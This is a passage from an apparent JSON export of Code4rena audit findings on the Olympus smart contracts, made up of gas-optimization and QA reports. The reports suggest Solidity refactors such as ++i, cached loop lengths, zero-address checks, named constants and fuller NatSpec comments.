i++; // == 1 but i == 2  But ++i returns the actual incremented value:  uint i = 1; ++i; // == 2 and i == 2 too, so no need for a temporary variable  In the first case, the compiler has to create a temporary variable (when used) for returning 1 instead of 2  ### Github Permalinks var++ https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/utils/KernelUtils.sol#L64 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L488 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L686  var-- https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L675 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L691   ### Mitigation Replace to ++i or --i as needed.    ## <array>.length should no be looked up in every loop of a for-loop ### Summary In loops not assigning the length to a variable so memory accessed a lot (caching local variables)  ### Details The overheads outlined below are PER LOOP, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas)  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Governance.sol#L278  ### Mitigation Assign the length of the array.length to a local variable in loops for gas savings     ## Shift right instead of dividing by 2 ### Summary Shifting is cheaper than dividing by 2  ### Details A division by 2 can be calculated by shifting one to the right. While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity\u2019s division operation also includes a division-by-0 prevention which is bypassed using shifting.  ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L372 `int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L427 `int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/interfaces/IBondAuctioneer.sol#L41 `/// @dev                        Should be calculated as: (payoutDecimals - quoteDecimals) - ((payoutPriceDecimals - quotePriceDecimals) / 2)`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L419 `uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L420 `uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;`  https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L786 `) * (FACTOR_SCALE + RANGE.spread(true) * 2)) /`  ### Mitigation Consider replacing / 2 with >> 1 here   ## Internal functions only called once can be inlined to save gas ### Summary Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls. ### Github Permalinks https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Heart.sol#L111-L114 https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/policies/Operator.sol#L652 https://github"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/459", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "### [G-01] No need to explicitly initialize variables with default values  ### Impact If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\u2026). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  #### Findings: ``` src/Kernel.sol::397 => for (uint256 i = 0; i < reqLength; ) { src/utils/KernelUtils.sol::43 => for (uint256 i = 0; i < 5; ) { src/utils/KernelUtils.sol::58 => for (uint256 i = 0; i < 32; ) { ```  ### [G-02] Cache Array Length Outside of Loop  #### Impact An array's length should be cached to save gas in for-loops Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration.  Here, I suggest storing the array's length in a variable before the for-loop, and use it instead:  #### Findings: ``` src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) { ```  ### [G-03] Use Shift Right/Left instead of Division/Multiplication if possible  #### Impact A division/multiplication by any number x being a power of 2 can be calculated by shifting log2(x) to the right/left.  While the DIV opcode uses 5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  #### Findings: ``` src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2); src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price; src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price; src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2); src/policies/Operator.sol::786 => ) * (FACTOR_SCALE + RANGE.spread(true) * 2)) / ``` Reference: https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g008---use-shift-rightleft-instead-of-divisionmultiplication-if-possible "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/457", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## [L-01] IT IS POSSIBLE THAT beat FUNCTION IS NOT CALLED FOR ENTIRE TIME DURING A FREQUENCY It is possible that the following `beat` function is not called by anybody for the entire time during a frequency. In this case, `PRICE.updateMovingAverage()` is not executed for that frequency. The price information for that frequency is not recorded, and the moving average becomes out-of-date as it is not updated with that frequency's price. Later, after someone calls `beat` again during a new frequency, the price information for the skipped frequency is still missing, and the duration between the current and earliest observations will be larger than specified. Because of this, the moving average deviates from the time-weighted average price to be more like an observation-weighted average price, which is also not as specified. To avoid these bookkeeping discrepancies, it can be beneficial to set up a bot to call `beat` for once during each frequency just in case nobody calls it during a frequency.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92-L109 ```solidity     function beat() external nonReentrant {         if (!active) revert Heart_BeatStopped();         if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle();          // Update the moving average on the Price module         PRICE.updateMovingAverage();          // Trigger price range update and market operations         _operator.operate();          // Update the last beat timestamp         lastBeat += frequency();          // Issue reward to sender         _issueReward(msg.sender);          emit Beat(block.timestamp);     } ```  ## [L-02] UNRESOLVED TODO COMMENTS Comment regarding todo indicates that there is an unresolved action item for implementation, which need to be addressed before protocol deployment. Please review the todo comments in the following code.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L657 ```solidity         /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary? ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L51-L67 ```solidity     // TODO Currently allows anyone to revoke any approval EXCEPT activated policies.     // TODO must reorg policy storage to be able to check for deactivated policies.     function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {         if (Policy(policy_).isActive()) revert PolicyStillActive();          // TODO Make sure `policy_` is an actual policy and not a random address.          uint256 len = tokens_.length;         for (uint256 j; j < len; ) {             TRSRY.setApprovalFor(policy_, tokens_[j], 0);             unchecked {                 ++j;             }         }          emit ApprovalRevoked(policy_, tokens_);     } ```  ## [L-03] MISSING ZERO-ADDRESS CHECK FOR CRITICAL ADDRESSES To prevent unintended behaviors, the critical address inputs should be checked against `address(0)`.  Please consider checking `ohm_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L15-L17 ```solidity     constructor(Kernel kernel_, address ohm_) Module(kernel_) {         ohm = OHM(ohm_);     } ```  Please consider checking the addresses of `ohmEthPriceFeed_` and `reserveEthPriceFeed_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L71-L77 ```solidity     constructor(         Kernel kernel_,         AggregatorV2V3Interface ohmEthPriceFeed_,         AggregatorV2V3Interface reserveEthPriceFeed_,         uint48 observationFrequency_,         uint48 movingAverageDuration_     ) Module(kernel_) { ```  Please consider checking the addresses in `tokens_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L77-L81 ```solidity     constructor(         Kernel kernel_,         ERC20[2] memory tokens_,         uint256[3] memory rangeParams_ // [thresholdFactor, cushionSpread, wallSpread]     ) Module(kernel_) { ```  Please consider checking the addresses of `aggregator_` and `ohm_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L38-L45 ```solidity     constructor(         Kernel kernel_,         IBondAggregator aggregator_,         ERC20 ohm_     ) Policy(kernel_) {         aggregator = aggregator_;         ohm = ohm_;     } ```  Please consider checking the addresses in `tokens_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L92-L98 ```solidity     constructor(         Kernel kernel_,         IBondAuctioneer auctioneer_,         IBondCallback callback_,         ERC20[2] memory tokens_, // [ohm, reserve]         uint32[8] memory configParams // [cushionFactor, cushionDuration, cushionDebtBuffer, cushionDepositInterval, reserveFactor, regenWait, regenThreshold, regenObserve]     ) Policy(kernel_) { ```  Please consider checking the address of `rewardToken_` in the following constructor. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L54-L59 ```solidity     constructor(         Kernel kernel_,         IOperator operator_,         ERC20 rewardToken_,         uint256 reward_     ) Policy(kernel_) { ```  ## [N-01] ESUBMISSION_REQUIREMENT IS USED TO COMPARE AGAINST 10000 BUT ENDORSEMENT_THRESHOLD AND EXECUTION_THRESHOLD ARE USED TO COMPARE AGAINST 100 `ESUBMISSION_REQUIREMENT`, `ENDORSEMENT_THRESHOLD`, and  `EXECUTION_THRESHOLD` in the following code are all used to represent percents. However, `ESUBMISSION_REQUIREMENT` is used to compare against 10000 while `ENDORSEMENT_THRESHOLD` and `EXECUTION_THRESHOLD` are used to compare against 100. This inconsistency can cause confusions and typos in the future. Please consider unifying these constants so they can be used to compare against the same number.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L119-L133 ```solidity     /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).     /// @dev    This is set to 1% of the total supply.     uint256 public constant SUBMISSION_REQUIREMENT = 100;      ...      /// @notice Endorsements required to activate a proposal as percentage of total supply.     uint256 public constant ENDORSEMENT_THRESHOLD = 20;      /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.     uint256 public constant EXECUTION_THRESHOLD = 33;  ```  ## [N-02] Unreachable code `return true;` is unreachable in the following code. It can be removed for better readability and maintainability.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L45-L48 ```solidity     function transfer(address to_, uint256 amount_) public pure override returns (bool) {         revert VOTES_TransferDisabled();         return true;     } ```  ## [N-03] decimals CAN BE NAMED USING CAPITAL LETTERS AND UNDERSCORES Because the following `decimals` is a constant, it can be named using capital letters and underscores by convention, which improves readability and maintainability.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59 ```solidity     uint8 public constant decimals = 18; ```  ## [N-04] CONSTANTS CAN BE USED INSTEAD OF MAGIC NUMBERS To improve readability and maintainability, constants can be used instead of the magic numbers. Please consider replacing the magic numbers used in the following code with constants. ```solidity modules\\PRICE.sol   90: if (exponent > 38) revert Price_InvalidParams();     modules\\RANGE.sol   245: wallSpread_ > 10000 ||    246: wallSpread_ < 100 ||    247: cushionSpread_ > 10000 ||    248: cushionSpread_ < 100 ||   policies\\Governance.sol   164: if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)   217: (totalEndorsementsForProposal[proposalId_] * 100) <  policies\\Operator.sol   103: if (configParams[1] > uint256(7 days) || configParams[1] < uint256(1 days))   106: if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();   108: if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])   111: if (configParams[4] > 10000 || configParams[4] < 100) revert Operator_InvalidParams();   114: configParams[5] < 1 hours ||   378: 36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals      433: 36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals      533: if (duration_ > uint256(7 days) || duration_ < uint256(1 days))   535: if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();   536: if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)   550: if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams();   565: if (wait_ < 1 hours || threshold_ > observe_ || observe_ == 0) ```  ## [N-05] INCOMPLETE NATSPEC COMMENTS NatSpec comments provide rich code documentation. @param or @return comments are missing for the following functions. Please consider completing NatSpec comments for them. ```solidity Kernel.sol   235: function executeAction(Actions action_, address target_) external onlyExec   351: function _migrateKernel(Kernel newKernel_) internal      439: function grantRole(Role role_, address addr_) public onlyAdmin {     451: function revokeRole(Role role_, address addr_) public onlyAdmin {  modules\\TRSRY.sol   64: function setApprovalFor(     75: function withdrawReserves(     92: function getLoan(ERC20 token_, uint256 amount_) external permissioned {     105: function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {     122: function setDebt(    modules\\VOTES.sol   45: function transfer(address to_, uint256 amount_) public pure override returns (bool) {     51: function transferFrom(   ```  ## [N-06] MISSING NATSPEC COMMENTS NatSpec comments provide rich code documentation. NatSpec comments are missing for the following functions. Please consider adding them. ```solidity Kernel.sol   266: function _installModule(Module newModule_) internal {     279: function _upgradeModule(Module newModule_) internal {     295: function _activatePolicy(Policy policy_) internal {     325: function _deactivatePolicy(Policy policy_) internal {     378: function _reconfigurePolicies(Keycode keycode_) internal {    391: function _setPolicyPermissions(    409: function _pruneFromDependents(Policy policy_) internal {   modules\\MINTR.sol   33: function mintOhm(address to_, uint256 amount_) public permissioned {      37: function burnOhm(address from_, uint256 amount_) public permissioned {     modules\\TRSRY.sol   47: function KEYCODE() public pure override returns (Keycode) {     51: function VERSION() external pure override returns (uint8 major, uint8 minor) {     59: function getReserveBalance(ERC20 token_) external view returns (uint256) {     137: function _checkApproval(    modules\\VOTES.sol   35: function mintTo(address wallet_, uint256 amount_) external permissioned {     39: function burnFrom(address wallet_, uint256 amount_) external permissioned {    utils\\KernelUtils.sol   11: function toKeycode(bytes5 keycode_) pure returns (Keycode) {      16: function fromKeycode(Keycode keycode_) pure returns (bytes5) {     21: function toRole(bytes32 role_) pure returns (Role) {     26: function fromRole(Role role_) pure returns (bytes32) {     31: function ensureContract(address target_) view {     40: function ensureValidKeycode(Keycode keycode_) pure {     55: function ensureValidRole(Role role_) pure {   ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/450", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## QA  ### Missing checks for address(0x0) when assigning values to address state variables  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L251  ```solidity File: /src/Kernel.sol 251:            executor = target_;  253:            admin = target_; ```  ### constants should be defined rather than using magic numbers There are several occurrences of literal values with unexplained meaning .Literal values in the codebase without an explained meaning make the code harder to read, understand and maintain, thus hindering the experience of developers, auditors and external contributors alike.  Developers should define a constant variable for every magic value used , giving it a clear and self-explanatory name. Additionally, for complex values, inline comments explaining how they were calculated or why they were chosen are highly recommended. Following [Solidity\u2019s style guide](https://solidity.readthedocs.io/en/latest/style-guide.html#constants), constants should be named in UPPER_CASE_WITH_UNDERSCORES format, and specific public getters should be defined to read each one of them.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L242-L250  ```solidity File: /src/modules/RANGE.sol     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {         // Confirm spreads are within allowed values         if (             wallSpread_ > 10000 ||  //@audit 1000             wallSpread_ < 100 ||    //@audit 100             cushionSpread_ > 10000 || //@audit 1000             cushionSpread_ < 100 || //@audit 100             cushionSpread_ > wallSpread_         ) revert RANGE_InvalidParams();       264:         if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();   ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L90 ```solidity File: /src/modules/PRICE.sol @audit: 38 90:        if (exponent > 38) revert Price_InvalidParams();  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L376-L379 ```solidity File: /src/policies/Operator.sol 376:            uint256 bondScale = 10 **  //@audit: 10 378:                uint8( 379:                    36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals //@audit: 36 340:                );  430:            uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals); //@audit: 10 431:            uint256 bondScale = 10 ** //@audit: 10 432:                uint8( 433:                    36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals //@audit: 36 434:                );  486:        while (price_ >= 10) { // @audit: 10 487:            price_ = price_ / 10;  // @audit: 10  518:        if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams(); //@audit: 10000 & 100  535:        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams(); //@audit: 10_000  550:        if (reserveFactor_ > 10000 || reserveFactor_ < 100) revert Operator_InvalidParams(); //@audit: 1000 & 100  753:                10**reserveDecimals * RANGE.price(true, false),  // @audit: 10 754:                10**ohmDecimals * 10**PRICE.decimals()  // @audit: 10  764:                10**ohmDecimals * 10**PRICE.decimals(), // @audit: 10 765:                10**reserveDecimals * RANGE.price(true, true) // @audit: 10  784:                    10**ohmDecimals * 10**PRICE.decimals(),  // @audit: 10 785:                    10**reserveDecimals * RANGE.price(true, true)  // @audit: 10 ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164 ```solidity File: /src/policies/Governance.sol 164:        if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT) // @audit: 10000  217:            (totalEndorsementsForProposal[proposalId_] * 100) < //@audit: 100  268:         if (netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD) { //@audit: 100 ```   ### Non-assembly method available ```assembly { size := extcodesize() } => uint256 size = address().code.length``` We can minimize the complexity of the project by avoiding  using assembly where it's not necessary  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L31-L37 ```solidity File: /src/utils/KernelUtils.sol 31:   function ensureContract(address target_) view { 32:     uint256 size; 33:     assembly { 34:        size := extcodesize(target_) 35:    } 36:    if (size == 0) revert TargetNotAContract(target_); 37: }  ``` ### public functions not called by the contract should be declared external instead Contracts are allowed to override their parents' functions and change the visibility from external to public.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L451-L458 ```solidity File: /src/Kernel.sol 451:    function revokeRole(Role role_, address addr_) public onlyAdmin { 452:        if (!isRole[role_]) revert Kernel_RoleDoesNotExist(role_); 453:        if (!hasRole[addr_][role_]) revert Kernel_AddressDoesNotHaveRole(addr_, role_);  455:        hasRole[addr_][role_] = false; 456: 457:        emit RoleRevoked(role_, addr_); 458:    }  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L451-L458  ```solidity File: /src/Kernel.sol     function grantRole(Role role_, address addr_) public onlyAdmin {         if (hasRole[addr_][role_]) revert Kernel_AddressAlreadyHasRole(addr_, role_);          ensureValidRole(role_);         if (!isRole[role_]) isRole[role_] = true;          hasRole[addr_][role_] = true;          emit RoleGranted(role_, addr_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L75-L85  ```solidity File: /src/modules/TRSRY.sol     function withdrawReserves(         address to_,         ERC20 token_,         uint256 amount_     ) public {         _checkApproval(msg.sender, token_, amount_);          token_.safeTransfer(to_, amount_);          emit Withdrawal(msg.sender, to_, token_, amount_);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L215-L219 ```solidity File: /src/modules/RANGE.sol     function updateMarket(         bool high_,         uint256 market_,         uint256 marketCapacity_     ) public permissioned { ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L37 ```solidity File: /src/modules/INSTR.sol 37:    function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L145 ```solidity File: /src/policies/Governance.sol 145:    function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) {  151:    function getActiveProposal() public view returns (ActivatedProposal memory) {  ```  ### Event is missing indexed fields  Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.  7 instances https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L20-L31  ```solidity File: /src/modules/RANGE.sol 20:    event WallUp(bool high_, uint256 timestamp_, uint256 capacity_);  21:    event WallDown(bool high_, uint256 timestamp_, uint256 capacity_);  22:    event CushionUp(bool high_, uint256 timestamp_, uint256 capacity_);  23:    event CushionDown(bool high_, uint256 timestamp_);  24:    event PricesChanged( 25:        uint256 wallLowPrice_, 26:        uint256 cushionLowPrice_, 27:        uint256 cushionHighPrice_, 28:        uint256 wallHighPrice_ 29:    );  30:    event SpreadsChanged(uint256 cushionSpread_, uint256 wallSpread_);  31:    event ThresholdFactorChanged(uint256 thresholdFactor_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L26-L28 ```solidity File: /src/modules/PRICE.sol 26:    event NewObservation(uint256 timestamp_, uint256 price_, uint256 movingAverage_);  27:    event MovingAverageDurationChanged(uint48 movingAverageDuration_);  28:    event ObservationFrequencyChanged(uint48 observationFrequency_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L11 ```solidity File: /src/modules/INSTR.sol 11:    event InstructionsStored(uint256 instructionsId); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L51-L54 ```solidity File: /src/policies/Operator.sol 51:    event CushionFactorChanged(uint32 cushionFactor_);  52:    event CushionParamsChanged(uint32 duration_, uint32 debtBuffer_, uint32 depositInterval_);  53:    event ReserveFactorChanged(uint32 reserveFactor_);  54:    event RegenParamsChanged(uint32 wait_, uint32 threshold_, uint32 observe_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L28-L30 ```solidity File: /src/policies/Heart.sol 28:    event Beat(uint256 timestamp_);  29:    event RewardIssued(address to_, uint256 rewardAmount_);  30:    event RewardUpdated(ERC20 token_, uint256 rewardAmount_); ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L86-L90 ```solidity File: /src/policies/Governance.sol 86:    event ProposalSubmitted(uint256 proposalId);  87:    event ProposalEndorsed(uint256 proposalId, address voter, uint256 amount);  88:    event ProposalActivated(uint256 proposalId, uint256 timestamp);  89:    event WalletVoted(uint256 proposalId, address voter, bool for_, uint256 userVotes);  90:    event ProposalExecuted(uint256 proposalId); ```  ### Unused named return Using both named returns and a return statement isn\u2019t necessary in  a function.To  improve code quality, consider using only one of those.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L51-L53  ```solidity File: /src/modules/TRSRY.sol 51:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 52:        return (1, 0); 53:    }  ``` https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L115-L117 ```solidity File: /src/modules/RANGE.sol 115:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 116:        return (1, 0); 117:    }  ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L113-L115 ```solidity File: /src/modules/PRICE.sol 113:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 114:        return (1, 0); 115:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L27-L29 ```solidity File: /src/modules/VOTES.sol 27:    function VERSION() external pure override returns (uint8 major, uint8 minor) { 28:        return (1, 0); 29:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L28-L30 ```solidity File: /src/modules/INSTR.sol 28:    function VERSION() public pure override returns (uint8 major, uint8 minor) { 29:        return (1, 0); 30:    } ```  ### Natspec is incomplete https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L234-L235 ```solidity File: /src/Kernel.sol  //@audit: Missing @param newKernel_ 75:    /// @notice Function used by kernel when migrating to a new kernel. 76:    function changeKernel(Kernel newKernel_) external onlyKernel {  //@audit: Missing @param action_ , @param target 234:    /// @notice Main kernel function. Initiates state changes to kernel depending on Action passed in. 235:    function executeAction(Actions action_, address target_) external onlyExecutor {   //@audit: Missing @param role_, @param addr_ 438:    /// @notice Function to grant policy-defined roles to some address. Can only be called by admin. 439:    function grantRole(Role role_, address addr_) public onlyAdmin {   //@audit: Missing @param role_, @param addr_ 450:    /// @notice Function to revoke policy-defined roles from some address. Can only be called by admin. 451:    function revokeRole(Role role_, address addr_) public onlyAdmin { ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L63-L68 ```solidity File: /src/modules/TRSRY.sol  //@audit: Missing @param withdrawer_,@param token_ , @param amount_ 63: /// @notice Sets approval for specific withdrawer addresses 64:    function setApprovalFor( 65:        address withdrawer_, 66:        ERC20 token_, 67:        uint256 amount_ 68:    ) external permissioned {  //@audit: Missing @param token_, @param amount_ 92:    function getLoan(ERC20 token_, uint256 amount_) external permissioned {  //@audit: Missing @param token_, @param amount_ 105:    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {   //@audit: Missing @param withdrawer_,@param token_ , @param amount_ 122:    function setDebt( 123:        ERC20 token_, 124:        address debtor_, 125:        uint256 amount_ 126:    ) external permissioned { ```   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L41-L42 ```solidity File: /src/modules/INSTR.sol  //@audit: Missing @param instructions_, @param returns  41:    /// @notice Store a list of Instructions to be executed in the future. 42:    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) { ```  ### Open todos https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L51  ```solidity File: /src/policies/TreasuryCustodian.sol  51:    // TODO Currently allows anyone to revoke any approval EXCEPT activated policies. 52:    // TODO must reorg policy storage to be able to check for deactivated policies.  56:   // TODO Make sure `policy_` is an actual policy and not a random address.  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L657 ```solidity File: /src/policies/Operator.sol 657:        /// TODO determine if this should use the last price from the MA or recalculate the current price, ideally last price is ok since it should have been just updated and should include check against secondary?  ```  ### Lack of event emission after critical initialize() functions  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L205 ```solidity File: /src/modules/PRICE.sol 205:     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) ```  ### The nonReentrant modifier should occur before all other modifiers This is a best-practice to protect against reentrancy in other modifiers  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L272 ```solidity File: /src/policies/Operator.sol     function swap(         ERC20 tokenIn_,         uint256 amountIn_,         uint256 minAmountOut_     ) external override onlyWhileActive nonReentrant returns (uint256 amountOut) { ``` "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/449", "labels": ["bug", "G (Gas Optimization)", 